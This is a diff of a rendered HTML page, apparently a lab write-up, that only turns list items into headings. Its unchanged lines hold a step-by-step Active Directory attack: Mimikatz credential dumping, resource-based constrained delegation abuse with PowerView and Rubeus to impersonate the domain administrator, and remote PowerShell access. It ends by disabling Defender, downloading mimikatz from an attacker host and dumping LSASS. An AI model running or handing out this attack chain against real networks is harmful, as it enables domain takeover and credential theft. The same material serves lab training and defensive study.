@@ -77,9 +77,7 @@
 
 <p>Abuse of permision in it-employeetest.it.gcb.local is posible access to it-track01 using constrained delegation based on user resource:</p>
 
-<ol>
-  <li>Impersonate IT-Employee15$ machine account domain:</li>
-</ol>
+<h3 id="1-impersonate-it-employee15-machine-account-domain">1. Impersonate IT-Employee15$ machine account domain:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
 
@@ -172,9 +170,7 @@ Cached Tickets: (1)
         Kdc Called:
 </code></pre></div></div>
 
-<ol>
-  <li>PowerView Modune with Get-DomainRBCD and Set-DomainRBCD cmdlets:</li>
-</ol>
+<h3 id="2-powerview-modune-with-get-domainrbcd-and-set-domainrbcd-cmdlets">2. PowerView Modune with Get-DomainRBCD and Set-DomainRBCD cmdlets:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; copy \\tsclient\tmp\RBCD\PowerView.ps1 PowerView_RBCD.ps1
 PS C:\tools&gt; Set-DomainRBCD -Verbose -Identity IT-TRACK01 -DelegateFrom IT-Employee15$
@@ -210,9 +206,7 @@ DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
 DelegatedDistinguishedName : CN=IT-EMPLOYEE15,OU=ITEmployees,DC=it,DC=gcb,DC=local
 
 </code></pre></div></div>
-<ol>
-  <li>Set Spn for it-track01:</li>
-</ol>
+<h3 id="3-set-spn-for-it-track01">3. Set Spn for it-track01:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; setspn.exe -r it-track01
 Registering ServicePrincipalNames for CN=IT-TRACK01,CN=Computers,DC=it,DC=gcb,DC=local
@@ -229,9 +223,7 @@ Registering ServicePrincipalNames for CN=IT-TRACK01,CN=Computers,DC=it,DC=gcb,DC
 Updated object
 </code></pre></div></div>
 
-<ol>
-  <li>validate IT-track01 msds-allowedtoactonbehalfofotheridentity:</li>
-</ol>
+<h3 id="4-validate-it-track01-serviceprincipalname-and-msds-allowedtoactonbehalfofotheridentity-properties-">4. validate IT-track01 serviceprincipalname and msds-allowedtoactonbehalfofotheridentity properties :</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; Get-ADComputer -Identity IT-TRACK01 -Properties * | select -ExpandProperty servicePrincipalname
 HTTP/it-track01.it.gcb.local
@@ -253,9 +245,7 @@ Path Owner                  Access
 
 </code></pre></div></div>
 
-<ol>
-  <li>Impersonate Domain Admin from it-employee15&amp; account domain:</li>
-</ol>
+<h3 id="5-impersonate-domain-admin-from-it-employee15-account-domain">5. Impersonate Domain Admin from it-employee15$ account domain:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; .\Rubeus.exe s4u /user:it-employee15$ /aes256:060cc6bb7bf5d57743ef25b94921146e12a55a2e83fed14d639802eed723f
 17c /msdsspn:HTTP/it-track01.it.gcb.local /impersonateuser:administrator /ptt
@@ -375,9 +365,7 @@ Path Owner                  Access
 [+] Ticket successfully imported!
 </code></pre></div></div>
 
-<ol>
-  <li>Access to the target machine:</li>
-</ol>
+<h3 id="6-access-to-the-target-machine">6. Access to the target machine:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; Enter-PSSession -ComputerName it-track01.it.gcb.local
 [it-track01.it.gcb.local]: PS C:\Users\Administrator.IT\Documents&gt; whoami
@@ -398,9 +386,7 @@ Ethernet adapter Ethernet:
    Default Gateway . . . . . . . . . : 192.168.4.254
 </code></pre></div></div>
 
-<ol>
-  <li>Diable AV and dump Lsass process:</li>
-</ol>
+<h3 id="7-disable-av-and-dump-lsass-process">7. Disable AV and dump Lsass process:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[it-track01.it.gcb.local]: PS C:\Users\Administrator.IT\Documents&gt; Set-MpPreference -DisableRealtimeMonitoring $True
 [it-track01.it.gcb.local]: PS C:\Users\Administrator.IT\Documents&gt; wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe
